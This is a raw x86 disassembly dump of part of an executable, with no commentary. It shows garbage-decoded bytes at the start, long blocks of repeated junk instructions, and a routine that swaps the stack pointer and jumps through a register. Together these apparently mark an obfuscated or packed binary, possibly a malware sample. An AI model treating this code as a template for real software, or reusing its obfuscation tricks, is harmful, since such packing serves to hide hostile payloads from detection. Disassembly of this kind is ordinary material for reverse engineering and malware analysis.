  44d33c:	cmp    DWORD PTR [esi],0x4bc7c8f1
  44d342:	ja     0x44d2f3
  44d344:	mov    dh,0x77
  44d346:	jns    0x44d317
  44d348:	add    DWORD PTR ds:0x526f5c9e,edi
  44d34e:	jmp    0xca75:0x7298e516
  44d355:	inc    esi
  44d356:	xchg   ebx,eax
  44d357:	iret   
  44d358:	aaa    
  44d359:	leave  
  44d35a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d35b:	cmp    al,BYTE PTR [ebx-0x3865dbd2]
  44d361:	mov    al,ds:0x8434622b
  44d366:	sub    al,0x27
  44d368:	ds dec esp
  44d36a:	push   ebp
  44d36b:	sbb    DWORD PTR [eax+0x3e],esi
  44d36e:	clc    
  44d36f:	sub    DWORD PTR [ecx+0x1d390d60],edx
  44d375:	lods   al,BYTE PTR ds:[esi]
  44d376:	scas   al,BYTE PTR es:[edi]
  44d377:	fbld   TBYTE PTR [ebx-0x6d]
  44d37a:	push   ecx
  44d37b:	ret    
  44d37c:	jne    0x44d345
  44d37e:	sub    edx,ebp
  44d380:	mov    ch,BYTE PTR [ebx-0x6dfedfa5]
  44d386:	jecxz  0x44d327
  44d388:	enter  0xcfac,0x1a
  44d38c:	dec    ebx
  44d38d:	(bad)  
  44d38e:	lds    edi,FWORD PTR [ecx]
  44d390:	test   BYTE PTR [eax+0x1c],cl
  44d393:	enter  0x1a66,0xa3
  44d397:	imul   ebp,DWORD PTR [esi+0x23],0xffffffc6
  44d39b:	retf   
  44d39c:	loop   0x44d3ed
  44d39e:	mov    edx,0x59f9acf4
  44d3a3:	test   eax,0x799132ad
  44d3a8:	sbb    dl,ch
  44d3aa:	shl    ah,cl
  44d3ac:	push   ebx
  44d3ad:	outs   dx,BYTE PTR ds:[esi]
  44d3ae:	mov    DWORD PTR [edx],esi
  44d3b0:	lods   eax,DWORD PTR ds:[esi]
  44d3b1:	mov    eax,ds:0xccccccd2
  44d3b6:	int3   
  44d3b7:	int3   
  44d3b8:	int3   
  44d3b9:	int3   
  44d3ba:	int3   
  44d3bb:	int3   
  44d3bc:	int3   
  44d3bd:	int3   
  44d3be:	int3   
  44d3bf:	int3   
  44d3c0:	push   ebp
  44d3c1:	mov    ebp,esp
  44d3c3:	pop    ebp
  44d3c4:	ret    0x10
  44d3c7:	int3   
  44d3c8:	int3   
  44d3c9:	int3   
  44d3ca:	int3   
  44d3cb:	int3   
  44d3cc:	int3   
  44d3cd:	int3   
  44d3ce:	int3   
  44d3cf:	int3   
  44d3d0:	push   ebp
  44d3d1:	mov    ebp,esp
  44d3d3:	pop    ebp
  44d3d4:	ret    0x10
  44d3d7:	int3   
  44d3d8:	int3   
  44d3d9:	int3   
  44d3da:	int3   
  44d3db:	int3   
  44d3dc:	int3   
  44d3dd:	int3   
  44d3de:	int3   
  44d3df:	int3   
  44d3e0:	push   ebp
  44d3e1:	mov    ebp,esp
  44d3e3:	call   0x44da40
  44d3e8:	mov    eax,ds:0x452204
  44d3ed:	push   eax
  44d3ee:	call   0x44e730
  44d3f3:	add    esp,0x4
  44d3f6:	mov    ds:0x452208,eax
  44d3fb:	pop    ebp
  44d3fc:	ret    
  44d3fd:	int3   
  44d3fe:	int3   
  44d3ff:	int3   
  44d400:	push   ebp
  44d401:	mov    ebp,esp
  44d403:	push   ecx
  44d404:	mov    DWORD PTR [ebp-0x4],0x4
  44d40b:	mov    eax,DWORD PTR [ebp-0x4]
  44d40e:	add    eax,0x4012a4
  44d413:	mov    ds:0x45220c,eax
  44d418:	mov    esp,ebp
  44d41a:	pop    ebp
  44d41b:	ret    
  44d41c:	int3   
  44d41d:	int3   
  44d41e:	int3   
  44d41f:	int3   
  44d420:	push   ebp
  44d421:	mov    ebp,esp
  44d423:	mov    eax,DWORD PTR [ebp+0x8]
  44d426:	mov    ecx,DWORD PTR [ebp+0x8]
  44d429:	add    ecx,DWORD PTR [eax+0x4]
  44d42c:	mov    eax,ecx
  44d42e:	pop    ebp
  44d42f:	ret    
  44d430:	push   ebp
  44d431:	mov    ebp,esp
  44d433:	mov    eax,DWORD PTR [ebp+0x8]
  44d436:	mov    eax,DWORD PTR [eax-0x4]
  44d439:	pop    ebp
  44d43a:	ret    
  44d43b:	int3   
  44d43c:	int3   
  44d43d:	int3   
  44d43e:	int3   
  44d43f:	int3   
  44d440:	push   ebp
  44d441:	mov    ebp,esp
  44d443:	sub    esp,0x18
  44d446:	mov    eax,DWORD PTR [ebp+0x8]
  44d449:	mov    DWORD PTR [ebp-0x8],eax
  44d44c:	mov    ecx,DWORD PTR [ebp+0xc]
  44d44f:	mov    DWORD PTR [ebp-0x4],ecx
  44d452:	mov    DWORD PTR [ebp-0x10],0x19c
  44d459:	mov    edx,DWORD PTR [ebp-0x8]
  44d45c:	mov    DWORD PTR ds:0x452210,edx
  44d462:	mov    eax,DWORD PTR [ebp-0x4]
  44d465:	mov    ds:0x452214,eax
  44d46a:	mov    ecx,DWORD PTR ds:0x452210
  44d470:	mov    DWORD PTR [ebp-0x14],ecx
  44d473:	mov    edx,DWORD PTR ds:0x452214
  44d479:	mov    DWORD PTR [ebp-0xc],edx
  44d47c:	mov    eax,DWORD PTR [ebp-0xc]
  44d47f:	mov    ecx,DWORD PTR [ebp-0x14]
  44d482:	lea    edx,[ecx+eax*2]
  44d485:	mov    DWORD PTR [ebp-0x18],edx
  44d488:	mov    eax,DWORD PTR [ebp-0x18]
  44d48b:	mov    DWORD PTR [ebp-0x14],eax
  44d48e:	mov    ecx,DWORD PTR [ebp-0x14]
  44d491:	movzx  edx,WORD PTR [ecx]
  44d494:	mov    DWORD PTR [ebp-0xc],edx
  44d497:	mov    eax,DWORD PTR [ebp-0xc]
  44d49a:	mov    esp,ebp
  44d49c:	pop    ebp
  44d49d:	ret    
  44d49e:	int3   
  44d49f:	int3   
  44d4a0:	push   ebp
  44d4a1:	mov    ebp,esp
  44d4a3:	sub    esp,0xc
  44d4a6:	mov    eax,DWORD PTR [ebp+0x8]
  44d4a9:	mov    DWORD PTR [ebp-0x8],eax
  44d4ac:	mov    ecx,DWORD PTR [ebp+0xc]
  44d4af:	mov    DWORD PTR [ebp-0xc],ecx
  44d4b2:	mov    DWORD PTR [ebp-0x4],0x11afc
  44d4b9:	mov    edx,DWORD PTR [ebp-0x8]
  44d4bc:	cmp    edx,DWORD PTR [ebp-0xc]
  44d4bf:	jae    0x44d4cf
  44d4c1:	mov    DWORD PTR [ebp-0x4],0x11afc
  44d4c8:	mov    eax,DWORD PTR [ebp-0x8]
  44d4cb:	jmp    0x44d4d9
  44d4cd:	jmp    0x44d4d9
  44d4cf:	mov    DWORD PTR [ebp-0x4],0x11afc
  44d4d6:	mov    eax,DWORD PTR [ebp-0xc]
  44d4d9:	mov    esp,ebp
  44d4db:	pop    ebp
  44d4dc:	ret    
  44d4dd:	int3   
  44d4de:	int3   
  44d4df:	int3   
  44d4e0:	push   ebp
  44d4e1:	mov    ebp,esp
  44d4e3:	push   ecx
  44d4e4:	mov    DWORD PTR [ebp-0x4],0x3085
  44d4eb:	mov    DWORD PTR [ebp-0x4],0x3085
  44d4f2:	mov    DWORD PTR [ebp-0x4],0x3085
  44d4f9:	mov    DWORD PTR [ebp-0x4],0x3085
  44d500:	mov    DWORD PTR [ebp-0x4],0x3085
  44d507:	mov    DWORD PTR [ebp-0x4],0x3085
  44d50e:	mov    DWORD PTR [ebp-0x4],0x3085
  44d515:	mov    DWORD PTR [ebp-0x4],0x3085
  44d51c:	mov    DWORD PTR [ebp-0x4],0x3085
  44d523:	mov    DWORD PTR [ebp-0x4],0x3085
  44d52a:	mov    DWORD PTR [ebp-0x4],0x3085
  44d531:	mov    DWORD PTR [ebp-0x4],0x3085
  44d538:	mov    DWORD PTR [ebp-0x4],0x3085
  44d53f:	mov    DWORD PTR [ebp-0x4],0x3085
  44d546:	mov    DWORD PTR [ebp-0x4],0x3085
  44d54d:	mov    DWORD PTR [ebp-0x4],0x3085
  44d554:	mov    DWORD PTR [ebp-0x4],0x3085
  44d55b:	mov    DWORD PTR [ebp-0x4],0x3085
  44d562:	mov    DWORD PTR [ebp-0x4],0x3085
  44d569:	mov    DWORD PTR [ebp-0x4],0x3085
  44d570:	mov    DWORD PTR [ebp-0x4],0x3085
  44d577:	mov    DWORD PTR [ebp-0x4],0x3085
  44d57e:	mov    DWORD PTR [ebp-0x4],0x3085
  44d585:	mov    DWORD PTR [ebp-0x4],0x3085
  44d58c:	mov    DWORD PTR [ebp-0x4],0x3085
  44d593:	mov    DWORD PTR [ebp-0x4],0x3085
  44d59a:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5a1:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5a8:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5af:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5b6:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5bd:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5c4:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5cb:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5d2:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5d9:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5e0:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5e7:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5ee:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5f5:	mov    DWORD PTR [ebp-0x4],0x3085
  44d5fc:	mov    DWORD PTR [ebp-0x4],0x3085
  44d603:	cmp    DWORD PTR [ebp+0x8],0x1
  44d607:	jne    0x44d611
  44d609:	mov    eax,ds:0x452218
  44d60e:	mov    DWORD PTR [ebp+0x8],eax
  44d611:	mov    ecx,DWORD PTR [ebp+0x10]
  44d614:	push   ecx
  44d615:	mov    edx,DWORD PTR [ebp+0xc]
  44d618:	push   edx
  44d619:	mov    eax,DWORD PTR [ebp+0x8]
  44d61c:	push   eax
  44d61d:	call   0x44e7b0
  44d622:	add    esp,0xc
  44d625:	mov    ecx,DWORD PTR [ebp+0x8]
  44d628:	push   ecx
  44d629:	call   0x44d420
  44d62e:	add    esp,0x4
  44d631:	mov    DWORD PTR [ebp+0x8],eax
  44d634:	mov    eax,DWORD PTR [ebp+0x8]
  44d637:	mov    esp,ebp
  44d639:	pop    ebp
  44d63a:	ret    
  44d63b:	int3   
  44d63c:	int3   
  44d63d:	int3   
  44d63e:	int3   
  44d63f:	int3   
  44d640:	push   ebp
  44d641:	mov    ebp,esp
  44d643:	push   ecx
  44d644:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d64b:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d652:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d659:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d660:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d667:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d66e:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d675:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d67c:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d683:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d68a:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d691:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d698:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d69f:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6a6:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6ad:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6b4:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6bb:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6c2:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6c9:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6d0:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6d7:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6de:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6e5:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6ec:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6f3:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d6fa:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d701:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d708:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d70f:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d716:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d71d:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d724:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d72b:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d732:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d739:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d740:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d747:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d74e:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d755:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d75c:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d763:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d76a:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d771:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d778:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d77f:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d786:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d78d:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d794:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d79b:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7a2:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7a9:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7b0:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7b7:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7be:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7c5:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7cc:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7d3:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7da:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7e1:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7e8:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7ef:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7f6:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d7fd:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d804:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d80b:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d812:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d819:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d820:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d827:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d82e:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d835:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d83c:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d843:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d84a:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d851:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d858:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d85f:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d866:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d86d:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d874:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d87b:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d882:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d889:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d890:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d897:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d89e:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8a5:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8ac:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8b3:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8ba:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8c1:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8c8:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8cf:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8d6:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8dd:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8e4:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8eb:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8f2:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d8f9:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d900:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d907:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d90e:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d915:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d91c:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d923:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d92a:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d931:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d938:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d93f:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d946:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d94d:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d954:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d95b:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d962:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d969:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d970:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d977:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d97e:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d985:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d98c:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d993:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d99a:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9a1:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9a8:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9af:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9b6:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9bd:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9c4:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9cb:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9d2:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9d9:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9e0:	mov    DWORD PTR [ebp-0x4],0x22a7
  44d9e7:	mov    eax,ds:0x45221c
  44d9ec:	sub    eax,0x8
  44d9ef:	mov    ds:0x45221c,eax
  44d9f4:	mov    ecx,DWORD PTR ds:0x45221c
  44d9fa:	mov    DWORD PTR [ebp-0x4],ecx
  44d9fd:	mov    edx,DWORD PTR [ebp-0x4]
  44da00:	shr    edx,1
  44da02:	mov    DWORD PTR [ebp-0x4],edx
  44da05:	mov    eax,DWORD PTR [ebp-0x4]
  44da08:	mov    ds:0x45221c,eax
  44da0d:	mov    esp,ebp
  44da0f:	pop    ebp
  44da10:	ret    
  44da11:	int3   
  44da12:	int3   
  44da13:	int3   
  44da14:	int3   
  44da15:	int3   
  44da16:	int3   
  44da17:	int3   
  44da18:	int3   
  44da19:	int3   
  44da1a:	int3   
  44da1b:	int3   
  44da1c:	int3   
  44da1d:	int3   
  44da1e:	int3   
  44da1f:	int3   
  44da20:	push   ebp
  44da21:	mov    ebp,esp
  44da23:	mov    edx,edx
  44da25:	mov    esp,DWORD PTR ds:0x452220
  44da2b:	mov    edx,edx
  44da2d:	add    esp,0x4
  44da30:	mov    edx,edx
  44da32:	mov    ecx,DWORD PTR ds:0x452224
  44da38:	mov    edx,edx
  44da3a:	jmp    ecx
  44da3c:	mov    edx,edx
  44da3e:	pop    ebp
  44da3f:	ret    
  44da40:	push   ebp
  44da41:	mov    ebp,esp
  44da43:	call   0x44d400
  44da48:	mov    eax,ds:0x45220c
  44da4d:	push   eax
  44da4e:	call   0x44d430
  44da53:	add    esp,0x4
  44da56:	mov    ds:0x452204,eax
  44da5b:	pop    ebp
  44da5c:	ret    
  44da5d:	int3   
  44da5e:	int3   
  44da5f:	int3   
  44da60:	push   ebp
  44da61:	mov    ebp,esp
  44da63:	sub    esp,0x28
  44da66:	mov    DWORD PTR [ebp-0x28],0x4016b2
  44da6d:	mov    DWORD PTR [ebp-0x24],0x1027
  44da74:	mov    DWORD PTR [ebp-0x18],0x4
  44da7b:	mov    eax,DWORD PTR [ebp-0x18]
  44da7e:	mov    ecx,DWORD PTR [ebp-0x28]
  44da81:	lea    edx,[ecx+eax*1+0x29]
  44da85:	mov    DWORD PTR [ebp-0x20],edx
  44da88:	mov    eax,DWORD PTR [ebp-0x20]
  44da8b:	mov    DWORD PTR [ebp-0x1c],eax
  44da8e:	mov    DWORD PTR [ebp-0x14],0x0
  44da95:	lea    ecx,[ebp-0x14]
  44da98:	push   ecx
  44da99:	push   0x0
  44da9b:	call   DWORD PTR ds:0x451438
  44daa1:	cmp    DWORD PTR [ebp-0x14],0x0
  44daa5:	jne    0x44daab
  44daa7:	xor    eax,eax
  44daa9:	jmp    0x44dab7
  44daab:	mov    edx,DWORD PTR [ebp-0x1c]
  44daae:	sub    edx,0x29
  44dab1:	mov    DWORD PTR ds:0x45220c,edx
  44dab7:	mov    esp,ebp
  44dab9:	pop    ebp
  44daba:	ret    
  44dabb:	int3   
  44dabc:	int3   
  44dabd:	int3   
  44dabe:	int3   
  44dabf:	int3   
  44dac0:	push   ebp
  44dac1:	mov    ebp,esp
  44dac3:	sub    esp,0xc
  44dac6:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dacd:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dad4:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dadb:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dae2:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dae9:	mov    DWORD PTR [ebp-0xc],0x1024a
  44daf0:	mov    DWORD PTR [ebp-0xc],0x1024a
  44daf7:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dafe:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db05:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db0c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db13:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db1a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db21:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db28:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db2f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db36:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db3d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db44:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db4b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db52:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db59:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db60:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db67:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db6e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db75:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db7c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db83:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db8a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db91:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db98:	mov    DWORD PTR [ebp-0xc],0x1024a
  44db9f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dba6:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbad:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbb4:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbbb:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbc2:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbc9:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbd0:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbd7:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbde:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbe5:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbec:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbf3:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dbfa:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc01:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc08:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc0f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc16:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc1d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc24:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc2b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc32:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc39:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc40:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc47:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc4e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc55:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc5c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc63:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc6a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc71:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc78:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc7f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc86:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc8d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc94:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dc9b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dca2:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dca9:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcb0:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcb7:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcbe:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcc5:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dccc:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcd3:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcda:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dce1:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dce8:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcef:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcf6:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dcfd:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd04:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd0b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd12:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd19:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd20:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd27:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd2e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd35:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd3c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd43:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd4a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd51:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd58:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd5f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd66:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd6d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd74:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd7b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd82:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd89:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd90:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd97:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dd9e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dda5:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddac:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddb3:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddba:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddc1:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddc8:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddcf:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddd6:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dddd:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dde4:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddeb:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddf2:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ddf9:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de00:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de07:	mov    DWORD PTR [ebp-0xc],0x1024a
